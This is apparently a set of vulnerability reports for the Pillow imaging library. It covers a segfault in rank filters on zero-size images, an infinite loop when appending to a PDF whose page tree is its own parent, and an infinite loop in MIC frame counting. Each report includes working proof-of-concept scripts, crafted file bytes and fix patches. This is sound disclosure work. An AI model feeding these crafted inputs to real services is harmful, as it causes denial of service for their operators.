Reproducer — repro, 1,333 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # Pillow: rank filters (Median/Min/Max/RankFilter) on a 0-wide or 0-high image # SIGSEGV in ImagingExpand (src/libImaging/Filter.c) - NULL line pointer read. # Each case runs in a child interpreter; BUG if the control returns and any # zero-size case dies of SIGSEGV. import signal, subprocess, sys CHILD = """ import resource; resource.setrlimit(resource.RLIMIT_CORE, (0, 0)) from PIL import Image, ImageFilter im = Image.new("L", (10, 10)).crop(%s) # public API; crop accepts x0==x1 / y0==y1 print(im.size, "->", end=" ", flush=True) print(im.filter(ImageFilter.%s).size) """ def run(box, flt): p = subprocess.run([sys.executable, "-c", CHILD % (box, flt)], capture_output=True, text=True) out = p.stdout.strip() if p.returncode < 0: out += " killed by " + signal.Signals(-p.returncode).name print(f" crop{box!s:<16} {flt:<18} {out}") return p.returncode ctrl = run((3, 0, 4, 10), "MedianFilter(3)") # (1,10): must work rcs = [run((3, 0, 3, 10), "MedianFilter(3)"), # (0,10) run((3, 0, 3, 10), "MaxFilter(5)"), run((0, 3, 10, 3), "MinFilter(3)"), # (10,0) run((3, 3, 3, 3), "RankFilter(3, 4)")] # (0,0) bug = ctrl == 0 and any(rc == -signal.SIGSEGV for rc in rcs) print("BUG" if bug else "OK") ```

summary: Infinite loop in PdfParser.rewrite_pages on page tree Parent cycle
description:
``` ============================================================================ ANT-2026-H2FAN35I [medium] CWE-835 dos Infinite loop in PdfParser.rewrite_pages on page tree Parent cycle Location: src/PIL/PdfParser.py:505 in PdfParser.rewrite_pages() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A PDF file of a few hundred bytes makes Pillow hang forever, holding one processor core at 100%, when an application tries to append an image to it. Anyone who can supply the existing PDF to an application that calls `im.save(fp, "PDF", append=True)` (or `save_all=True, append=True`) can tie up that worker indefinitely. Memory use stays flat, so only an external timeout stops it. The bug is in `PdfParser.rewrite_pages()` in `src/PIL/PdfParser.py` (the `while pages_tree_node_ref:` loop at line 505). For each original page, it walks the `/Parent` chain upward and stops only when it reaches a node with no `/Parent`. It keeps no record of nodes it has already visited, so a loop in that chain never ends. The simplest case is a `/Pages` root that lists itself as its own `/Parent`; a longer cycle among page-tree nodes behaves the same way. The path is `PdfImagePlugin._save()` → `write_catalog()` → `rewrite_pages()`, and it is reached whether the save target is a file path or a `BytesIO`. Plain `Image.open()` pipelines are not affected, because Pillow only parses PDFs on the append path. This is a sibling of CVE-2026-42310 (the cyclic trailer `/Prev` loop in the same parser). The `processed_offsets` guard added to `read_prev_trailer()` for that issue does not cover this walk. The loop was introduced in 24ecfe315ab5 (2018-03-03) and has been present in every release since 5.1.0. The attached reproducer builds two in-memory PDFs and appends a 4×4 image to each. The normal file finishes in about 45 ms. The 333-byte self-parented file is still spinning inside `rewrite_pages()` when a 5-second watchdog interrupts it. Two alternative fixes are attached: one silently tolerates the cycle, and one rejects the file with an error. ## Details `PdfParser.rewrite_pages()` walks the `/Parent` chain of every pre-existing page upward and stops only when a node has no `/Parent`. It keeps no record of visited nodes, so a page-tree node whose `/Parent` points at itself, or at any node below it, makes the walk spin forever. The following 333-byte file is a valid one-page PDF except that object 2, the page-tree root, declares `/Parent 2 0 R`: ``` %PDF-1.4 1 0 obj <> endobj 2 0 obj <> endobj 3 0 obj <> endobj xref 0 4 0000000000 65535 f 0000000009 00000 n 0000000056 00000 n 0000000125 00000 n trailer <> startxref 192 %%EOF ``` `Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True)` on these bytes never returns and holds one core at 100 % (the same happens when the target is a file path opened `r+b`). Interrupting it with `SIGALRM` after 5 s gives this traceback every time: ``` File "src/PIL/PdfImagePlugin.py", line 263, in _save existing_pdf.write_catalog() File "src/PIL/PdfParser.py", line 473, in write_catalog self.rewrite_pages() File "src/PIL/PdfParser.py", line 505, in rewrite_pages while pages_tree_node_ref: ``` The same file without `/Parent 2 0 R` on object 2 is appended to in ~30 ms. The loop: ```python # src/PIL/PdfParser.py:483-510 def rewrite_pages(self) -> None: pages_tree_nodes_to_delete = [] for i, page_ref in enumerate(self.orig_pages): page_info = self.cached_objects[page_ref] del self.xref_table[page_ref.object_id] pages_tree_nodes_to_delete.append(page_info[PdfName(b"Parent")]) … # delete redundant Pages tree nodes from xref table for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: pages_tree_node = self.cached_objects[pages_tree_node_ref] if pages_tree_node_ref.object_id in self.xref_table: del self.xref_table[pages_tree_node_ref.object_id] pages_tree_node_ref = pages_tree_node.get(b"Parent", None) self.orig_pages = [] ``` How the input gets there: with `append=True`, `PdfImagePlugin._save()` opens the existing bytes with `PdfParser.PdfParser(f=fp, …, mode="r+b")` (`src/PIL/PdfImagePlugin.py:199`), whose constructor calls `read_pdf_info()`. That reads the catalog, reads the page-tree root through `read_indirect()` — which stores every object it reads in `self.cached_objects` (`src/PIL/PdfParser.py:1077`) — and flattens the tree with `linearize_page_tree()`, which `read_indirect()`s every `/Kids` entry. So after parsing, `orig_pages == [3 0 R]` and objects 2 and 3 are both in `cached_objects`. `_save()` then calls `existing_pdf.write_catalog()` → `rewrite_pages()`. For the file above, the first loop puts page 3's `/Parent`, `2 0 R`, into `pages_tree_nodes_to_delete`. The inner `while` looks object 2 up in `cached_objects`, removes it from the xref table on the first pass, and sets `pages_tree_node_ref` to object 2's `/Parent` — which is `2 0 R` again. Nothing in the loop body changes on subsequent iterations, so it never exits: `cached_objects[2 0 R]` is never evicted, and deleting an already-deleted id from `XrefTable` is silent — `__delitem__` only records the id in `deleted_entries`, while `__contains__` keeps answering from `existing_entries`. The loop performs no I/O and no allocation, so neither `MemoryError` nor the recursion limit intervenes. A longer cycle behaves identically as long as every node on it was reached through `linearize_page_tree()` and is therefore cached (e.g. root 2 → `/Kids [4 0 R]`, node 4 → `/Kids [3 0 R] /Parent 2 0 R`, and root 2 declaring `/Parent 4 0 R`); a `/Parent` pointing at an object that was never read raises `KeyError` instead, which is harmless. The parser already defends against exactly this shape of problem one level up: `read_prev_trailer()` (`src/PIL/PdfParser.py:699-722`) carries a `processed_offsets` list and raises `PdfFormatError("trailer loop found")` when a `/Prev` offset repeats — the fix for CVE-2026-42310. The `/Parent` walk in `rewrite_pages()` has no equivalent guard. The unguarded walk was introduced in `24ecfe315ab5` ("issue #2959: fix wrong Parent of pre-existing Page objects when appending", 2018-03-03) and has been in every release since 5.1.0. ## Impact Any application that appends pages to a PDF it did not produce — `im.save(fp, "PDF", append=True)` or `save_all=True, append=True` on a user-supplied document — hangs indefinitely with one CPU core pinned, on an input of a few hundred bytes. The loop is pure Python doing two dict lookups per iteration, so memory stays flat and memory limits do not end it; only an external watchdog does. In a web worker or batch converter that is a denial of service of that worker per request. The attacker needs to control only the bytes of the existing PDF; no non-default Pillow setting is involved beyond the application choosing the append path. Pillow does not open PDFs for reading, so plain `Image.open()` pipelines are not affected. This is a sibling of CVE-2026-42310 (infinite loop on a cyclic trailer `/Prev` chain in the same parser, same entry point): same class, different linked structure, and the guard added for that CVE does not cover it. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (`/src/src/PIL`). It needs no build step and no companion files, and takes about 5 seconds. The script builds two one-page PDFs in memory with `make_pdf()`. Each has a Catalog (object 1), a `/Pages` root (object 2) and a `/Page` (object 3), and each has a correct xref table. The only difference between them is in object 2: - `control` has `<>`. This is a normal file. - `cyclic` has `<>`, so the page-tree root names itself as its own `/Parent`. This is the 333-byte file shown above. For each PDF the script prints the bytes and then calls `Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True)` under a 5-second `SIGALRM` watchdog. If the watchdog fires, the script prints the Pillow frames the append was running in. The control runs first and has to finish. If it doesn't, the environment is broken, so the script prints `OK` without giving a verdict. Expected output on this commit (PDF dumps omitted): ``` [control] append finished in 0.045s [cyclic] still running after 5s, interrupted in: save() /src/src/PIL/Image.py:2724 save_handler(self, fp, filename) _save() /src/src/PIL/PdfImagePlugin.py:263 existing_pdf.write_catalog() write_catalog() /src/src/PIL/PdfParser.py:473 self.rewrite_pages() rewrite_pages() /src/src/PIL/PdfParser.py:506 pages_tree_node = self.cached_objects[pages_tree_node_ref] ... BUG ``` The innermost one or two frames change from run to run, because the alarm can land anywhere in the loop body at lines 505–509. The `rewrite_pages()` frame is always there. The control's timing shows that the same file without the self-reference is appended to in milliseconds. A fixed parser either finishes the cyclic append just as fast or rejects the file with an exception. In both cases the script prints `OK`. With attached patch 1 applied it prints `[cyclic] append finished in 0.001s` and `OK`. With attached patch 2 it prints `[cyclic] raised PdfFormatError: page tree loop found` and `OK`. The last line is `BUG` only when the cyclic append is still running when the watchdog fires. ## Suggested fix Both attached patches fix the root cause, which is that the `/Parent` walk in `rewrite_pages()` keeps no record of the nodes it has visited. Either one can be merged; they differ only in what happens to a malformed file. **Attached patch 1** (tolerant; our preference) adds one `processed_pages_tree_nodes` set that is shared across all pages in the delete loop, and breaks out of the `while` as soon as it reaches a node it has already seen: ```python # src/PIL/PdfParser.py, rewrite_pages() processed_pages_tree_nodes: set[IndirectReference] = set() for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: if pages_tree_node_ref in processed_pages_tree_nodes: break processed_pages_tree_nodes.add(pages_tree_node_ref) … ``` Breaking loses nothing, because a visited node has already been removed from the xref table. The output is the same as today for every file that terminates. The file above is appended to normally, and object 2 ends up deleted. As a side effect, the ancestor chain that every page shares is walked once in total rather than once per page. **Attached patch 2** (strict) follows the `read_prev_trailer()` guard from the CVE-2026-42310 fix. It keeps a `processed_pages_tree_nodes` list for each page and calls `check_format_condition(pages_tree_node_ref not in processed_pages_tree_nodes, "page tree loop found")`, so a cyclic file is rejected with `PdfFormatError`. The list is per page because ancestors are legitimately shared between the pages of a well-formed document. Note that the error is raised from `write_catalog()`. By then the new page objects have already been written to the `r+b` file, but the new xref/trailer has not. Any other error raised on the append path today leaves the file in the same partially written state. Each patch also adds a `test_page_tree_parent_loop` regression test to `Tests/test_pdfparser.py`. The test builds the self-parented PDF above in memory, so no binary test asset is needed. No other `/Parent` walk exists in the parser, and `linearize_page_tree()` does not follow `/Parent`. Note that this walk follows `/Parent` links, which nothing else in `PdfParser` reads: `linearize_page_tree()` only follows `/Kids` downward and never looks at `/Parent`, so a visited-set added to the `/Kids` recursion (see Related findings) does not reach this loop. The file above has a perfectly tree-shaped `/Kids` structure and still hangs; both walks need their own guard, and they are natural to land together as one "validate page tree while appending" change. ## Related findings - **Exponential page tree expansion in `PdfParser.linearize_page_tree()` (repeated `/Kids` references) hangs PDF append** — the downward counterpart of this bug in the same parser and on the same `Image.save(..., "PDF", append=True)` entry point: `linearize_page_tree()` (`src/PIL/PdfParser.py:1080-1094`) recurses into every `/Kids` entry and re-parses it via `read_indirect()` with no visited set, so a `/Pages` chain whose nodes list the same child N times over D levels costs ND object parses (a 1.9 KB, 10-wide × 12-level file never returns; a 5.8 KB, 300-wide × 3-level file runs for 13 minutes; a direct `/Kids` cycle ends in `RecursionError`). It differs from this report in the link followed (`/Kids` down vs `/Parent` up), the function and phase (`linearize_page_tree()` during `read_pdf_info()` in the `PdfParser` constructor vs `rewrite_pages()` during `write_catalog()`), the introducing commit (`6207b44ab1ff` vs `24ecfe315ab5`), and the symptom (exponential but finite CPU vs a true infinite loop). It needs a separate hunk: the patches attached here only guard the `/Parent` walk and leave the `/Kids` reproducer hanging in `linearize_page_tree()`, and the `/Kids` guard conversely leaves this reproducer spinning in `rewrite_pages()` — verified by cross-applying each patch. Applied together (the `/Kids` guard plus attached patch 2), both reproducers are rejected with `PdfFormatError: page tree loop found` and `Tests/test_pdfparser.py` + `Tests/test_file_pdf.py` pass (30 tests). ## The patch (1 of 2) Track visited page-tree nodes in PdfParser.rewrite_pages() so a cyclic /Parent chain cannot loop forever when appending to a PDF Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/Tests/test_pdfparser.py b/Tests/test_pdfparser.py index f2ae6b11f..f841aca14 100644 --- a/Tests/test_pdfparser.py +++ b/Tests/test_pdfparser.py @@ -169,3 +169,28 @@ def test_duplicate_xref_entry() -> None: def test_trailer_loop() -> None: with pytest.raises(PdfFormatError, match="trailer loop found"): PdfParser("Tests/images/trailer_loop.pdf") + + +@pytest.mark.timeout(5) +def test_page_tree_parent_loop() -> None: + # the /Pages root names itself as its own /Parent + objects = [ + b"<>", + b"<>", + b"<>", + ] + b = BytesIO(b"%PDF-1.4\n") + offsets = [] + for object_id, body in enumerate(objects, start=1): + offsets.append(b.tell()) + b.write(b"%d 0 obj\n%s\nendobj\n" % (object_id, body)) + xref_offset = b.tell() + b.write(b"xref\n0 4\n0000000000 65535 f \n") + b.write(b"".join(b"%010d 00000 n \n" % offset for offset in offsets)) + b.write(b"trailer\n<>\nstartxref\n%d\n%%%%EOF\n" % xref_offset) + + with PdfParser(f=b, mode="r+b") as pdf: + pdf.start_writing() + pdf.write_catalog() + pdf.write_xref_and_trailer() + assert 2 in pdf.xref_table.deleted_entries diff --git a/src/PIL/PdfParser.py b/src/PIL/PdfParser.py index 672557190..9260cd8e7 100644 --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ -501,8 +501,14 @@ class PdfParser: # replace the page reference with the new one self.pages[j] = new_page_ref # delete redundant Pages tree nodes from xref table + processed_pages_tree_nodes: set[IndirectReference] = set() for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: + if pages_tree_node_ref in processed_pages_tree_nodes: + # ancestors are shared between pages, and a malformed + # /Parent chain may loop back on itself + break + processed_pages_tree_nodes.add(pages_tree_node_ref) pages_tree_node = self.cached_objects[pages_tree_node_ref] if pages_tree_node_ref.object_id in self.xref_table: del self.xref_table[pages_tree_node_ref.object_id] ``` ## The patch (2 of 2) Raise PdfFormatError("page tree loop found") in PdfParser.rewrite_pages() when a page's /Parent chain loops back on itself Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/Tests/test_pdfparser.py b/Tests/test_pdfparser.py index f2ae6b11f..24faeefbc 100644 --- a/Tests/test_pdfparser.py +++ b/Tests/test_pdfparser.py @@ -169,3 +169,27 @@ def test_duplicate_xref_entry() -> None: def test_trailer_loop() -> None: with pytest.raises(PdfFormatError, match="trailer loop found"): PdfParser("Tests/images/trailer_loop.pdf") + + +@pytest.mark.timeout(5) +def test_page_tree_parent_loop() -> None: + # the /Pages root names itself as its own /Parent + objects = [ + b"<>", + b"<>", + b"<>", + ] + b = BytesIO(b"%PDF-1.4\n") + offsets = [] + for object_id, body in enumerate(objects, start=1): + offsets.append(b.tell()) + b.write(b"%d 0 obj\n%s\nendobj\n" % (object_id, body)) + xref_offset = b.tell() + b.write(b"xref\n0 4\n0000000000 65535 f \n") + b.write(b"".join(b"%010d 00000 n \n" % offset for offset in offsets)) + b.write(b"trailer\n<>\nstartxref\n%d\n%%%%EOF\n" % xref_offset) + + with PdfParser(f=b, mode="r+b") as pdf: + pdf.start_writing() + with pytest.raises(PdfFormatError, match="page tree loop found"): + pdf.write_catalog() diff --git a/src/PIL/PdfParser.py b/src/PIL/PdfParser.py index 672557190..9021b8d63 100644 --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ -502,7 +502,13 @@ class PdfParser: self.pages[j] = new_page_ref # delete redundant Pages tree nodes from xref table for pages_tree_node_ref in pages_tree_nodes_to_delete: + processed_pages_tree_nodes = [] while pages_tree_node_ref: + check_format_condition( + pages_tree_node_ref not in processed_pages_tree_nodes, + "page tree loop found", + ) + processed_pages_tree_nodes.append(pages_tree_node_ref) pages_tree_node = self.cached_objects[pages_tree_node_ref] if pages_tree_node_ref.object_id in self.xref_table: del self.xref_table[pages_tree_node_ref.object_id] ``` ## The reproducer
Reproducer — repro, 3,152 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 """Infinite loop in PdfParser.rewrite_pages() on a cyclic /Parent chain. Appending an image to an existing PDF (im.save(fp, "PDF", append=True)) makes rewrite_pages() walk each original page's /Parent chain upward until a node has no /Parent. Nothing records which nodes were visited, so a /Pages node that names itself as its own /Parent keeps the walk going forever. We append a 4x4 image to two one-page PDFs that differ in one entry: control - a normal PDF -> finishes in milliseconds cyclic - the /Pages root also says /Parent 2 0 R -> never finishes A SIGALRM watchdog interrupts the append and shows the line it was stuck on. """ import io import signal import time import traceback from PIL import Image WATCHDOG_S = 5 def make_pdf(pages_root): """Catalog (1) -> /Pages root (2) -> /Page (3), with a correct xref table.""" objects = [ b"<>", pages_root, b"<>", ] pdf = bytearray(b"%PDF-1.4\n") offsets = [] for num, body in enumerate(objects, start=1): offsets.append(len(pdf)) pdf += b"%d 0 obj\n%s\nendobj\n" % (num, body) xref_offset = len(pdf) pdf += b"xref\n0 4\n0000000000 65535 f \n" pdf += b"".join(b"%010d 00000 n \n" % off for off in offsets) pdf += b"trailer\n<>\nstartxref\n%d\n%%%%EOF\n" % xref_offset return bytes(pdf) class StillRunning(BaseException): pass def on_alarm(signum, frame): raise StillRunning def append_image(name, pdf): """Append an image to `pdf`; return True if it finished before the watchdog.""" print(f"--- {name}: {len(pdf)}-byte PDF ---") print(pdf.decode("latin-1"), end="") signal.alarm(WATCHDOG_S) start = time.monotonic() try: Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True) except StillRunning as e: print(f"[{name}] still running after {WATCHDOG_S}s, interrupted in:") for frame in traceback.extract_tb(e.__traceback__): if "/PIL/" in frame.filename: print(f" {frame.name}() {frame.filename}:{frame.lineno} {frame.line}") return False except Exception as e: # rejecting the file is a correct, safe outcome print(f"[{name}] raised {type(e).__name__}: {e}") return True finally: signal.alarm(0) print(f"[{name}] append finished in {time.monotonic() - start:.3f}s") return True signal.signal(signal.SIGALRM, on_alarm) # Set up: the well-formed file is appended to instantly. control = make_pdf(b"<>") if not append_image("control", control): print("control case did not finish; environment problem, no verdict") print("OK") raise SystemExit # Attack: the same file, except the /Pages root is its own /Parent. cyclic = make_pdf(b"<>") finished = append_image("cyclic", cyclic) # Verify: a fixed parser finishes (or rejects the file) like the control. print("BUG" if not finished else "OK") ```

summary: Infinite loop in MIC n_frames when the embedded TIFF has 3+ IFDs
description:
``` ============================================================================ ANT-2026-GTEADN4J [medium] CWE-835 dos Infinite loop in MIC n_frames when the embedded TIFF has 3+ IFDs Location: src/PIL/MicImagePlugin.py:86 in MicImageFile.tell() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 5.6 KB image file makes Pillow loop forever at 100% CPU when an application asks how many frames the image has. This only affects installations that have the optional `olefile` package. Any application that opens an untrusted image and then reads `im.n_frames` can have one worker tied up indefinitely. That includes the common "is this image animated?" check and re-saving with `save_all=True` to TIFF, PDF or WebP. The call never returns, raises no exception, and does not grow memory, so only an external watchdog stops it. The file is a Microsoft Image Composer (MIC) container, which Pillow recognises by its magic bytes with no extension needed. Inside it is a TIFF stream with three chained image directories. `MicImageFile` subclasses `TiffImageFile` and overrides `seek()` and `tell()` so that a "frame" means one stream in the container. It still inherits `TiffImageFile.n_frames` (`src/PIL/TiffImagePlugin.py:1212`), which walks the embedded TIFF's directory chain with `self._seek(self.tell() + 1)` until `_n_frames` is set. Two things stop that walk from making progress: - `MicImageFile.tell()` (`src/PIL/MicImagePlugin.py:86`) returns the constant stream index. - `MicImageFile.seek()` calls `TiffImageFile._open()`, which resets `_n_frames` to `None`. As a result, the loop re-parses the second directory forever whenever the embedded stream has three or more directories. `Image.open()`, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. The regression was introduced in 0b33a87b0d15 (April 2020, first released in 7.2.0), which removed `MicImageFile`'s own `n_frames` property. The attached reproducer builds the file in code and checks two controls, which return 3 and 1 frames as expected; the malicious file is still running when it is killed after 20 seconds. ## Details `MicImageFile` (registered for `Image.open` whenever `olefile` is installed) subclasses `TiffImageFile` and redefines a "frame" as one OLE `*.ACI/Image` stream, overriding `seek()` and `tell()` accordingly. It does not override the `n_frames` property, so the inherited TIFF implementation runs, and that implementation relies on `tell()` advancing as IFDs are loaded. `MicImageFile.tell()` returns the OLE stream index, which never changes inside `n_frames`, so the loop re-parses the same IFD forever. A 5632-byte OLE2 compound file whose `img0.ACI/Image` stream is a 351-byte TIFF with three chained 1×1 IFDs is enough. `Image.open()` on it succeeds (format `MIC`, detected by the OLE magic, no extension needed); evaluating `im.n_frames` then never returns and keeps one core at 100 %. A Python stack taken 27 s in is ``` File "src/PIL/TiffImagePlugin.py", line 1622 in _setup File "src/PIL/TiffImagePlugin.py", line 1271 in _seek File "src/PIL/TiffImagePlugin.py", line 1219 in n_frames ``` and instrumenting `_seek` shows it being called with `frame=1`, `tell()==0`, `_frame_pos==[8, 122]`, `_n_frames is None` on every iteration — identical state, so the loop is non-terminating, not merely slow. The same 351 TIFF bytes opened directly give `n_frames == 3` in milliseconds, and the same container around a 1-IFD TIFF gives `n_frames == 1`. The loop, `src/PIL/TiffImagePlugin.py:1212`: ```python @property def n_frames(self) -> int: current_n_frames = self._n_frames if current_n_frames is None: current = self.tell() self._seek(len(self._frame_pos)) while self._n_frames is None: self._seek(self.tell() + 1) # 1219 self.seek(current) ``` and the overrides that break its progress assumption, `src/PIL/MicImagePlugin.py:76`: ```python def seek(self, frame: int) -> None: … self.fp = self.ole.openstream(filename) TiffImagePlugin.TiffImageFile._open(self) # 82: resets _n_frames to None self.frame = frame def tell(self) -> int: return self.frame # 87: OLE stream index, not TIFF __frame ``` For a plain TIFF, `_seek(k)` (`TiffImagePlugin.py:1236`) loads IFDs up to `k`, appending each offset to `_frame_pos`, setting `_n_frames` when an IFD's next-pointer is 0 (or already seen), and setting the private `__frame = k`; `TiffImageFile.tell()` returns `__frame`, so `self.tell() + 1` walks the chain to its end. For a MIC file, `Image.open` → `MicImageFile._open` sets `self._n_frames = len(self.images)` at line 69, but then calls `self.seek(0)` → `TiffImageFile._open` (line 82), which unconditionally sets `self._n_frames = None` (`TiffImagePlugin.py:1203`) and `_seek(0)`s into the embedded stream. With the 3-IFD stream, IFD 0 has a non-zero next pointer, so `_n_frames` stays `None` after open. `n_frames` then runs: `current = self.tell()` is `0` (the OLE index); `_seek(len(_frame_pos))` = `_seek(1)` loads IFD 1, whose next pointer is also non-zero and not yet in `_frame_pos`, so `_n_frames` is still `None`. The `while` body computes `self.tell() + 1` = `0 + 1` and calls `_seek(1)` again; `len(_frame_pos)` is already 2, so nothing new is loaded — IFD 1 is re-read via `tag_v2.load` and `_setup()` and the state is unchanged. This repeats indefinitely; IFD 2 is never reached. Two chained IFDs are not enough (IFD 1's next pointer of 0 sets `_n_frames = 2` on the first `_seek(1)`); three or more are. `Tests/test_file_mic.py::test_n_frames` passes only because `hopper.mic`'s stream has a single IFD, so `_seek(0)` sets `_n_frames = 1` and the loop is never entered; the `len(self.images)` assignment at line 69 is only consumed by the initial `_seek_check(0)` and is overwritten before any caller can read `n_frames`. A side effect of the same mismatch: with a 2-IFD stream `n_frames` returns 2 (TIFF IFDs) while `seek(1)` indexes `self.images[1]` (OLE streams) and raises `IndexError` — visible with `save_all=True`. ## Impact Any application that lets Pillow open an uploaded file and then reads `im.n_frames` — the usual way to decide whether an image is animated (`getattr(im, "n_frames", 1) > 1`), and also what `hasattr(im, "n_frames")`/`getattr(im, "n_frames", 1)` in Pillow's own `TiffImagePlugin._save_all` (`:2333`), `PdfImagePlugin._save` (`:250`) and `WebPImagePlugin._save_all` (`:171`) evaluate when the app re-saves with `save_all=True` — can be made to spin one worker at 100 % CPU indefinitely with a 5.6 KB upload. The file needs no particular extension (OLE magic; `FpxImagePlugin` rejects it on CLSID and `MicImagePlugin` accepts it), default limits do not intervene, memory does not grow, and no exception is raised, so only an external watchdog ends it. Preconditions: `olefile` installed (it is an optional dependency; without it the MIC plugin is not registered) and the application touching `n_frames` or a `save_all` path. `Image.open()` itself, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. This is the same class of tiny-file, pure-Python non-termination as CVE-2021-28676 (FLI) and CVE-2021-28677 (EPS), and like CVE-2019-19911 (FPX) it depends on `olefile`; it differs in not being reached by the default open/load path. The regression was introduced in `0b33a87b0d15` ("Replaced property methods for n_frames and is_animated with normal properties", 2020-04-13), first released in 7.2.0, which replaced `MicImageFile`'s own `n_frames` property with the `_n_frames` attribute that `TiffImageFile._open` overwrites. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (with `olefile`, which is what registers the MIC plugin). It builds every input in code, writes each one to a temporary file named `x` with no extension (so Pillow identifies the format from its magic bytes), and opens it in a child Python process that runs `Image.open(path)` and prints `im.format` and `im.n_frames`. It builds two things in code: - `tiff(n)`: an `n`-page TIFF of 4×4 greyscale frames written by Pillow itself (`save_all=True`), so the IFDs are chained exactly as Pillow's own writer chains them. The last next-IFD pointer is 0. - `mic(stream)`: a minimal OLE2 compound file with a storage named `img0.ACI` that contains a stream named `Image`, which is the layout `MicImageFile._open` looks for. Sector 0 is the FAT and sector 1 is the directory. The stream starts at sector 2 and is padded to 4096 bytes, so the file doesn't need a mini-FAT. The result is 5632 bytes. It runs three inputs, each in its own child process with a hard 20-second kill: 1. control: the plain 3-page TIFF. Expected `TIFF n_frames = 3`. 2. control: a MIC wrapping a 1-page TIFF. Expected `MIC n_frames = 1`. 3. attack: the same MIC container wrapping the 3-page TIFF. The timeout is enforced by killing the child rather than by an in-process alarm, because a `TimeoutError` raised while `ImageFileDirectory_v2.load()` is parsing would be caught by its `except OSError` (`TiffImagePlugin.py:958`) and leave the IFD half-parsed instead of stopping the loop. The script prints `BUG` when both controls return and the attack child is still running after 20 seconds; otherwise it prints `OK`. With the attached patch applied, the attack case prints `MIC n_frames = 1` and the script prints `OK`. ## Suggested fix The attached patch restores the OLE-level frame count after the embedded TIFF stream has been opened, so the inherited `n_frames` never enters its IFD-walking loop and `n_frames`/`seek()` agree on what a frame is. In `MicImageFile.seek`, `src/PIL/MicImagePlugin.py:82`, right after `TiffImagePlugin.TiffImageFile._open(self)`: ```diff TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame ``` Doing this in `seek()` restores the invariant on every seek, not only the first. The existing assignments at lines 69–70 of `_open` are kept: the initial `seek(0)` → `_seek_check(0)` reads `n_frames` before `TiffImageFile._open` has run, so they are still needed. Plain read-only `n_frames`/`is_animated` properties, as before 0b33a87b0, are no longer a drop-in option because `TiffImageFile._seek` assigns `self.is_animated`. With the patch applied to a clean tree and rebuilt, the attack file returns `n_frames == 1` immediately, a 2-IFD stream raises `EOFError` on `seek(1)` instead of `IndexError`, `save_all=True` to TIFF and PDF completes, and `Tests/test_file_mic.py` and `Tests/test_file_tiff.py` pass. No regression test is included, since one would need a new binary MIC fixture in `Tests/images`. The patch passed that check but has not been reviewed beyond it as the final form of the fix. Two things it leaves alone: it does not add the `_im` reset that `TiffImageFile.seek` performs after `_seek` (`TiffImagePlugin.py:1229`), which matters when switching between OLE streams of different size or mode; and `TiffImageFile.n_frames` still advances via the overridable `tell()` rather than its private `__frame`, so making it iterate on `__frame` would protect any other subclass that redefines `tell()`. ## The patch Restore the OLE stream frame count in MicImageFile.seek() after TiffImageFile._open() resets it, so n_frames cannot loop forever Applies to `src/PIL/MicImagePlugin.py` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix. ```diff diff --git a/src/PIL/MicImagePlugin.py b/src/PIL/MicImagePlugin.py index f8cf3a76f..2bb0109ce 100644 --- a/src/PIL/MicImagePlugin.py +++ b/src/PIL/MicImagePlugin.py @@ -81,6 +81,11 @@ class MicImageFile(TiffImagePlugin.TiffImageFile): TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame def tell(self) -> int: ``` ## The reproducer
Reproducer — repro, 2,330 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # MicImageFile inherits TiffImageFile.n_frames, whose loop `self._seek(self.tell()+1)` # relies on tell() advancing; MicImageFile.tell() returns the OLE stream index (constant), # so a MIC file whose Image stream is a TIFF with >=3 chained IFDs makes im.n_frames spin forever. import io, struct, subprocess, sys, tempfile, os from PIL import Image def tiff(n): # n-page TIFF written by Pillow itself b = io.BytesIO(); fr = [Image.new("L", (4, 4), i) for i in range(n)] fr[0].save(b, "TIFF", save_all=True, append_images=fr[1:]); return b.getvalue() def mic(stream): # minimal OLE2 file: storage "img0.ACI" containing stream "Image" END, FREE, FATSECT = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD data = stream.ljust(4096, b"\0"); n = len(data) // 512 fat = [FATSECT, END] + [3 + k for k in range(n - 1)] + [END]; fat += [FREE] * (128 - len(fat)) def entry(name, kind, child, start, size): raw = name.encode("utf-16-le") + b"\0\0" return raw.ljust(64, b"\0") + struct.pack(" {out}"); return hung c1 = run("control: 3-page TIFF, direct", tiff(3)) c2 = run("control: MIC around 1-page TIFF", mic(tiff(1))) bug = run("attack: MIC around 3-page TIFF", mic(tiff(3))) print("BUG" if bug and not c1 and not c2 else "OK") ```
